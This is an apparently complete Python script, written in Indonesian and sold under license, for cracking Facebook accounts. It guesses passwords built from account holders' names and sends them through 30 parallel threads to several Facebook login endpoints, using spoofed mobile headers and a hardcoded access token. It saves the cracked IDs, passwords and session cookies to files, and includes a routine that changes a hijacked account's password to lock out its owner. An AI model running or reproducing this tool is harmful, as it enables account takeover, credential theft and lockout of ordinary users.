                          head = {'Host':'graph.facebook.com','x-fb-connection-bandwidth': repr(random.randint(2e7, 3e7)), 'x-fb-sim-hni': repr(random.randint(2e4, 4e4)), 'x-fb-net-hni': repr(random.randint(2e4, 4e4)),'x-fb-connection-quality': 'EXCELLENT','user-agent': uasz,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                          date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'sdk_version': {random.randrange(2, 31)}, 'email': uid, 'locale': 'id_ID', 'password': pw, 'sdk': 'android', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
                          xnxx = ses.post("https://graph.facebook.com/auth/login", params=date, headers=head, allow_redirects=False).json()
                          if "session_key" in xnxx:
                              coki = ";".join(i["name"]+"="+i["value"] for i in xnxx["session_cookies"])
                              print(f"\rID : {H}{uid}\nPW : {H}{pw}\nCOOKIE : {H}{coki}  ")
                              kntl = (f"{H}{uid}|{pw}|{coki}")
                              OK.append(kntl)
                              with open(f"OK/OK-{indo}.txt", "a", encoding="utf-8") as r:
                                    r.write(kntl+"\n")
                              break

                          elif "www.facebook.com" in xnxx["error"]["message"]:
                              print(f"\rID : {K}{uid}\nPW : {K}{pw}  ")
                              kntl = (f"{K}{uid}|{pw}")
                              CP.append(kntl)
                              with open(f"CP/CP-{indo}.txt", "a", encoding="utf-8") as r:
                                   r.write(kntl+"\n")
                              break
                          else:continue

             except requests.exceptions.ConnectionError: time.sleep(35)
        loop +=1

    # UNTUK VERSI YANG KEDUA
    def b_api(self, uid, pas):
        global loop, OK, CP
        warna = random.choice([M,K,H,U,P,O,B])
        print(f'\r {warna}Rayan-XD {P}{loop}/{len(ID2)} {H}OK{P}:{H}{len(OK)} {K}CP{P}:{K}{len(CP)}', end=' ');sys.stdout.flush()
        for pw in pas:
             try:
                     with requests.Session() as ses:
                          headers = {
                                'Host':'graph.facebook.com',
                                'x-fb-connection-bandwidth': repr(random.randint(2e7, 3e7)),
                                'x-fb-sim-hni': repr(random.randint(2e4, 4e4)),
                                'x-fb-net-hni': repr(random.randint(2e4, 4e4)),
                                'x-fb-connection-quality': 'EXCELLENT',
                                'user-agent': self.ua_fb(),
                                'content-type': 'application/x-www-form-urlencoded',
                                'x-fb-http-engine': 'Liger'
                          }
                          data_req = {
                                'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',
                                'format': 'JSON',
                                'sdk_version': {random.randrange(2, 31)},
                                'email': uid,
                                'locale': random.choice(['en_US','id_ID','ja_JP']),
                                'password': pw,
                                'sdk': 'android',
                                'generate_session_cookies': '1',
                                'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'
                          }
                          session = ses.post("https://graph.facebook.com/auth/login", params=data_req, headers=headers, allow_redirects=False).json()
                          if "session_key" in session:
                               cookie = ";".join(asep["name"]+"="+asep["value"] for asep in session["session_cookies"])
                               print(f'\rID : {H}{uid}\nPW : {H}{pw}\nCOOKIE : {H}{cookie}')
                               OK.append("ANJAY")
                               save = f'{H}{uid}|{pw}|{cookie}'
                               with open(f"OK/OK-{indo}.txt", "a", encoding="utf-8") as X:
                                    X.write(save+"\n")
                               break
                          elif "www.facebook.com" in session["error"]["message"]:
                               CP.append("MAMPUS")
                               print(f'\r{K}{uid}|{pw}   ')
                               save = f'{uid}|{pw}'
                               with open(f"OK/OK-{indo}.txt", "a", encoding="utf-8") as X:
                                    X.write(save+"\n")
                               break
                          else:continue
             except requests.exceptions.ConnectionError: time.sleep(35)
        loop +=1

def gasken():
    cetak('\tPILIH URL LOGIN DATA ANDA ')
    ray = ('[bold green][[bold white]01[bold green]] [bold white]m.facebook.com\n[bold green][[bold white]02[bold green]] [bold white]free.facebook.com\n[bold green][[bold white]03[bold green]] [bold white]x.facebook.com')
    Console(width=50).print(Panel(ray , style='bold red'))
    url = input(' ───► ')
    if url in ['1','01']:tag='m.facebook.com'
    elif url in ['2','02']:tag='free.facebook.com'
    else:tag="x.facebook.com"
    MarkZuberGBangkrut().takon_sandi(tag)

class MarkZuberGBangkrut:
    def takon_sandi(self,url):
        cetak('\tWORLDLIST/PASSWORD FOR CRACK ')
        cetak('''[bold green][[bold white]01[bold green]] [bold white]nama, nama 1 sampai 4
[bold green][[bold white]02[bold green]] [bold white]nama, nama 1 sampai 5
[bold green][[bold white]03[bold green]] [bold white]nama, nama 1 sampai 5 + custom''')
        addeh = input(' ───► ')
        if addeh in ['3','03']:
           cetak('[bold white]Gunakaan tanda koma untuk pemisahan password')
           sandi = input(' ───► ')
           self.password(addeh, url, sandi)
        else:
           sandi = ''
           self.password(addeh, url, sandi)

    def password(self,khamdihiDEV, link, add_pw):
        exec = (f'[bold green][[bold white]•[bold green]] [bold white]OK save in : OK/OK-{indo}.txt\n[bold green][[bold white]•[bold green]] [bold white]CP save in : CP/CP-{indo}.txt')
        Console(width=50).print(Panel(exec ,style='bold white'))
        with khamdihiXV(max_workers=30) as cod:
            for user in ID2:
                uid, nama = user.split("/")[0], user.split("/")[1]
                depan = nama.split(" ")[0]
                if khamdihiDEV in ['2','02']:
                   if len(nama) <=5:
                      if len(depan) <=1 or len(depan) <=2:pass
                      else:
                          pwx = [nama, depan+"123", depan+"1234", depan+"12345", depan+"321",nama.lower()]
                   else:
                        pwx = [nama, depan+"123", depan+"1234", depan+"12345", depan.lower()+'123',depan.lower()+'1234',nama.lower()]

                   if 'reguler' in tod:
                       if 'v1' in versi:
                           if 'm.facebook.com' in link:
                               code = True
                           else:
                               code = False
                           cod.submit(self.crackxv, uid, pwx, link, code)
                       else:
                           if 'm.facebook.com' in link:
                               code=True
                           else:
                               code=False
                           cod.submit(self.crackxv2, uid, pwx, link, code)
                   else:
                       code = False
                       cod.submit(self.Validate, uid, pwx, link, code)

                elif khamdihiDEV in ['3','03']:
                   if len(nama) <=5:
                      if len(depan) <=1 or len(depan) <=2:pass
                      else:
                          pwe = [nama, depan+"123", depan+"1234", depan+"12345", depan+"321",nama.lower()]
                   else:
                        pwe = [nama, depan+"123", depan+"1234", depan+"12345", depan+"321",depan.lower()+'123',depan.lower()+'1234',nama.lower()]
                   pwx = pwe + add_pw.split(',')
                   if 'reguler' in tod:
                       if 'v1' in versi:
                           if 'm.facebook.com' in link:
                              code = True
                           else:
                              code = False
                           cod.submit(self.crackxv, uid, pwx, link, code)
                       else:
                           if 'm.facebook.com' in link:
                               code=True
                           else:
                               code=False
                           cod.submit(self.crackxv2, uid, pwx, link, code)
                   else:
                       code = False
                       cod.submit(self.Validate, uid, pwx, link, code)

                else:
                     if len(nama) <=5:
                        if len(depan) <=1 or len(depan) <=2:pass
                        else:
                            pwx = [nama, depan+"123", depan+"1234", depan+"12345", depan+"321",nama.lower()]
                     else:
                         pwx = [nama, depan+"123", depan+"1234", depan+"12345", depan+"321", depan.lower()+'123',depan.lower()+'1234',nama.lower()]

                     if 'reguler' in tod:
                         if 'v1' in versi:
                             if 'm.facebook.com' in link:
                                code = True
                             else:
                                code = False
                             cod.submit(self.crackxv, uid, pwx, link, code)
                         else:
                             if 'm.facebook.com' in link:
                                code = True
                             else:
                                code = False
                             cod.submit(self.crackxv2, uid, pwx, link, code)
                     else:
                         code = False
                         cod.submit(self.Validate, uid, pwx, link, code)
        print('\n')
        exit(cetak('[bold green]Proses crack sudah selesai, python main.py'))

    def crackxv(self, user, pwx, url, Response):
        global loop, OK,CP
        warna = random.choice([M,K,H,U,P,O,B])
        print(f'\r {P}[{warna}crackv1{P}] {H}{url}{N} {loop}/{len(ID2)} OK:{len(OK)} CP:{len(CP)}', end=' ');sys.stdout.flush()
        for pw in pwx:
             try:
                     with requests.Session() as ses:
                          ua=MetaForCrack().ua_fb()
                          link = ses.get(f'https://{url}/login/?refsrc=deprecated&ref_component=mbasic_footer&_rdr').text
                          data = {'lsd':re.search('name="lsd" value="(.*?)"',link).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"',link).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"',link).group(1),'li':re.search('name="li" value="(.*?)"',link).group(1),'try_number':re.search('name="try_number" value="(.*?)"',link).group(1),'unrecognized_tries':re.search('name="unrecognized_tries" value="(.*?)"',link).group(1),'email':user,'pass':pw,'login':'Masuk'}
                          head = {"Host": url,"upgrade-insecure-requests": "1","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"}
                          xxxx = ses.post('https://' + head['Host'] + '/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100',data=data, headers=head,allow_redirects=Response)
                          if 'c_user' in ses.cookies.get_dict():
                               kueh = ';'.join([str(a)+'='+str(b) for a,b in ses.cookies.get_dict().items()])
                               uuid = re.search('c_user=(.*?);', kueh).group(1)
                               print('\r %s*  --> %s|%s|%s             '%(H,uuid,pw,kueh))
                               open('OK/OK-{}.txt'.format(indo),'a').write('%s|%s|%s\n'%(user,pw,kueh))
                               OK.append('X')
                               break

                          elif 'checkpoint' in ses.cookies.get_dict():
                               uuid = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                               print('\r %s*  --> %s|%s                          '%(K,uuid,pw))
                               open('CP/CP-{}.txt'.format(indo),'a').write('%s|%s\n'%(uuid,pw))
                               CP.append('X')
                               break
                          else:continue
             except requests.exceptions.ConnectionError: time.sleep(30)
        loop +=1

    def Validate(self, user, pwx, url, res):
        global loop, OK, CP
        warna = random.choice([M,K,H,U,P,O,B])
        print(f'\r {P}[{warna}validate{P}] {H}{url}{N} {loop}/{len(ID2)} OK:{len(OK)} CP:{len(CP)}', end=' '); sys.stdout.flush()
        for pw in pwx:
             try:
                     with requests.Session() as x:
                          ua = MetaForCrack().ua_fb()
                          link = x.get(f"https://{url}/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr").text
                          data = {'lsd':re.search('name="lsd" value="(.*?)"', link).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', link).group(1),'uid':user,'next':re.search('name="next" value="(.*?)"', link).group(1),'flow':'login_no_pin','encpass':'#PWD_BROWSER:{}:{}:{}'.format('0',int(waktu()),pw)}
                          head = {'Host': url,'content-length': f'{len(str(data))}','cache-control': 'max-age=0','sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': f'https://{url}','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': f'https://{url}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                          posh = x.post(f"https://{url}/login/device-based/validate-password/?shbl=0", data=data, headers=head,allow_redirects=res)
                          if 'c_user' in x.cookies.get_dict():
                               kueh = ';'.join([str(a)+'='+str(b) for a,b in x.cookies.get_dict().items()])
                               uuid = re.search('c_user=(.*?);', kueh).group(1)
                               print('\r %s*  --> %s|%s|%s             '%(H,uuid,pw,kueh))
                               open('OK/OK-{}.txt'.format(indo),'a').write('%s|%s|%s\n'%(user,pw,kueh))
                               OK.append(author)
                               break

                          elif 'checkpoint' in x.cookies.get_dict():
                               print('\r %s*  --> %s|%s                   \x1b[1;91m'%(K,user,pw))
                               open('CP/CP-{}.txt'.format(indo),'a').write('%s|%s\n'%(user,pw))
                               CP.append(author)
                               break
                          else:continue
             except requests.exceptions.ConnectionError: time.sleep(35)
        loop +=1

    def crackxv2(self, user, pwx, url, res):
        global loop,OK,CP
        warna = random.choice([M,K,H,U,P,O,B])
        print(f'\r {P}[{warna}crackv2{P}] {H}{url}{N} {loop}/{len(ID2)} OK:{len(OK)} CP:{len(CP)}', end=' '); sys.stdout.flush()
        for pw in pwx:
             try:
                     with requests.Session() as ses:
                          uuaa = MetaForCrack().ua_fb()
                          link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2F{url}%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1668827966897%26e2e%3D%257B%2522init%2522%253A1668827966897%257D%26ies%3D1%26sdk%3Dandroid-12.3.0%26sso%3Dchrome_custom_tab%26nonce%3D08f6d9d9-d89a-4963-8c29-188416b61053%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522a1da178b-cbb8-4bb7-a4d2-3e4c39dd39bd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522rjom4nre5ejh71h34dnv%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da1da178b-cbb8-4bb7-a4d2-3e4c39dd39bd%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522a1da178b-cbb8-4bb7-a4d2-3e4c39dd39bd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522rjom4nre5ejh71h34dnv%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
                          data = {'lsd':re.search('name="lsd" value="(.*?)"', link).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', link).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', link).group(1),'li':re.search('name="li" value="(.*?)"', link).group(1),'try_number':'0','unrecognized_tries':'0','email':user,'pass':pw,"bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', link).group(1)}
                          head = {'Host': url,'content-length': f'{len(str(data))}','cache-control': 'max-age=0','sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': f'https://{url}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                          posh = ses.post(f"https://{url}/login/device-based/login/async/?api_key=345000986033587&auth_token=27ebc3abcddc54f212cd9808d68e650c&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1668827966897%26e2e%3D%257B%2522init%2522%253A1668827966897%257D%26ies%3D1%26sdk%3Dandroid-12.3.0%26sso%3Dchrome_custom_tab%26nonce%3D08f6d9d9-d89a-4963-8c29-188416b61053%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522a1da178b-cbb8-4bb7-a4d2-3e4c39dd39bd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522rjom4nre5ejh71h34dnv%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da1da178b-cbb8-4bb7-a4d2-3e4c39dd39bd%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522a1da178b-cbb8-4bb7-a4d2-3e4c39dd39bd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522rjom4nre5ejh71h34dnv%2522%257D%23_%3D_&lwv=100",data=data,headers=head,allow_redirects=res)
                          if 'c_user' in ses.cookies.get_dict():
                               kueh = ';'.join([str(a)+'='+str(b) for a,b in ses.cookies.get_dict().items()])
                               uuid = re.search('c_user=(.*?);', kueh).group(1)
                               print('\r %s*  --> %s|%s|%s                       '%(H,uuid,pw,kueh))
                               open('OK/OK-{}.txt'.format(indo),'a').write('%s|%s|%s\n'%(user,pw,kueh))
                               OK.append(author)
                               break

                          elif 'checkpoint' in ses.cookies.get_dict():
                               uuid = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                               print('\r %s*  --> %s|%s                   \x1b[1;91m'%(K,uuid,pw))
                               open('CP/CP-{}.txt'.format(indo),'a').write('%s|%s\n'%(uuid,pw))
                               CP.append(author)
                               break
                          else:continue
             except requests.exceptions.ConnectionError: time.sleep(30)
        loop +=1

    def UbahPassword(self, user, password_old, coki, url):
        try:password_new = open('password_baru_kamu.txt','r').read()
        except:password_new = password_old
        with requests.Session() as ses:
             try:
                     link = ses.get(f'https://{url}/settings/security/password/',cookies={'cookie':coki})
                     data = {
                         'fb_dtsg':re.search('name="fb_dtsg" value="(.*?)"', link.text).group(1),
                         'jazoest':re.search('name="jazoest" value="(.*?)"', link.text).group(1),
                         'password_change_session_identifier':re.search('name="password_change_session_identifier" value="(.*?)"', link.text).group(1),
                         'password_old':password_old,
                         'password_new':password_new,
                         'password_confirm':password_new,
                         'save':'Simpan perubahan'
                     }
                     find = parse(link.text,'html.parser').find('form',method='post')['action']
                     posh = ses.post(f'https://{url}' + find, data=data, cookies = {'cookie':coki})
                     if 'Kata Sandi Telah Diubah' in posh.text:
                          print('\r %s   • %sBerhasil mengubah password		%s'%(H,N,N))
                     else:
                          print('\r %s   • %sGagal mengubah password			%s'%(M,N,N))
             except Exception as e:print('\r %s   • %sGagal mengubah password			%s'%(M,N,N))

    def cek_apk(self,kuki):
        try:
               aktif,kadarluarsa = 0,0
               coki = {"cookie":'noscript=1;locale=id_ID;' + kuki}
               link = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki)
               parz = parse(link.text,"html.parser")
               dihi = parz.find("form",method="post")
               cari = [kontol.text for kontol in dihi.find_all("h3")]
               if len(cari) == 0:
                    print('\r %s   • %sTidak ada aplikasi aktif                     %s'%(M,P, P))
               else:
                    for memek in range(len(cari)):
                        aktif +=1
                        print("\r     %s%s. %s%s"%(H,aktif,P,cari[memek].replace("Ditambahkan pada"," Ditambahkan pada")))

               print(' ')
               link = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki)
               parz = parse(link.text,"html.parser")
               dihi = parz.find("form",method="post")
               cari = [kontol.text for kontol in dihi.find_all("h3")]
               if len(cari) == 0:
                     print('\r %s   • %sTidak ada aplikasi kadarluarsa     %s'%(M,P, P))
               else:
                     for memek in range(len(cari)):
                         kadarluarsa +=1
                         print("\r     %s%s. %s%s"%(M,kadarluarsa,P,cari[memek].replace("Kedaluwarsa"," Kedaluwarsa")))
        except Exception as e:print('\r     %s• %scookie anda invalid    		'%(N,M))


def key():
    os.system("clear")
    try:code=open('data/key.txt','r').read()
    except FileNotFoundError:buy()
    var(code)

def buy():
    os.system('clear')
    Banner1()
    cetak('''[bold green][[bold white]01[bold green]] [bold white]Beli license
[bold green][[bold white]02[bold green]] [bold white]Masukan licensi
[bold green][[bold white]03[bold green]] [bold white]Keluar dari pemrogramman ''')
    asu = input(' ───► ')
    if asu in ['1','01']:subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=+6285729416714&text=Bang mau buy lisensi script crack fb"]);buy()
    elif asu in ['2','02']:
          cetak('[bold white]Harap untuk tidak membagikan license kepada orang lain')
          jembut = input(' ───► ')
          if jembut in ['',' ']:exit(cetak('[bold red]Hem, sepertinya kamu tidak memasukan apapun'))
          else:var(jembut)
    elif asu in ['3','03']:exit(cetak('[bold green]Terima kasih telah berkunjung'))
    else:buy()

def var(api):
    with requests.Session() as asu:
         try:
              t = 'WyIyOTA3NTQ4MiIsIkdTRENFRmVMWGIwaGN1OW5ZNStwZWJBVGxtQWFuWEU0RVp6TTRXTUQiXQ=='
              i  = '18094'
              link = asu.get("https://app.cryptolens.io/api/key/Activate?token={}&ProductId={}&Key={}".format(t,i,api)).json()
              print(link)
              hasil = link["licenseKey"]["expires"][:10] ; tahu,bula,tang = hasil.split("-")
              isin = "%s%s%s"%(tang,bula,tahu) ; neww = "%s%s%s"%(hri,bln,thn)
              form = "%d%m%Y" ; tess = datetime.strptime(isin,form)
              mekk = datetime.strptime(neww,form) ; z = tess - mekk
              port = z.days
              print(link)
              if port <1:
                   cetak('[bold yellow]ups, lisensi kamu sudah tidak aktif, hubungi admin')
                   input(' ───► ')
                   os.system("rm -rf data/key.txt data/sisa.txt")
                   buy()
              else:
                   cetak(f'''[bold green][[bold white]>[bold green]] [bold white]Kadarluarsa   : [bold green]{port} hari lagi
[bold green][[bold white]>[bold green]] [bold white]Kunci lisensi : [bold green]{api}[bold white]''')
                   open('data/key.txt','w').write(api)
                   open('data/sisa.txt','w').write(f'{port}')
                   input(' ───► ')
                   menu()
         except KeyError:
            cetak('[bold red]Licensi anda sudah kadarluarsa, silakan hubungi admin')
            input(' ───► ')
            os.system("rm -rf data/key.txt")
            buy()


def false():
    try:os.mkdir('data')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    menu()

# MAU NGAPAIN OM.
if __name__ == '__main__':
   #buy()
   false()

